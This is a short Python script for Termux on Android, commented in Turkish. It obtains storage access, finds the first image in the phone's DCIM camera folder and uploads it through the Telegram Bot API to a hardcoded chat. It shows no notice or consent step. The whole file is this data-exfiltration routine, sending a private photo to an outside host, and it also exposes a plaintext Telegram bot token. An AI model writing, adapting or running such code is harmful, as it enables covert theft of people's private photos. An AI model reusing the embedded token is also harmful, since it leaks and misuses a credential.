import os
import requests
import json
import time

# Telegram Bilgileri
TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

def send_telegram_photo(photo_path):
    """Belirtilen fotoğrafı Telegram'a gönderir."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        try:
            response = requests.post(url, files=files, data=data)
            print(response.json())
        except Exception as e:
            print(f"Fotoğraf gönderme hatası: {e}")

# Termux depolama erişimi için izin al
os.system("termux-setup-storage")
time.sleep(2)  # İzin işlemi için bekleme süresi

# Termux ile galerideki fotoğrafları listele
os.system("find /storage/emulated/0/DCIM/ -type f | head -n 1 > first_photo.txt")

# İlk fotoğrafın yolunu al
try:
    with open("first_photo.txt", "r") as f:
        first_photo = f.readline().strip()

        if first_photo:
            # Fotoğrafı Telegram'a gönder
            send_telegram_photo(first_photo)
        else:
            print("Galeri boş veya fotoğraf bulunamadı.")

except Exception as e:
    print(f"Fotoğraf bulunamadı veya hata oluştu: {e}")
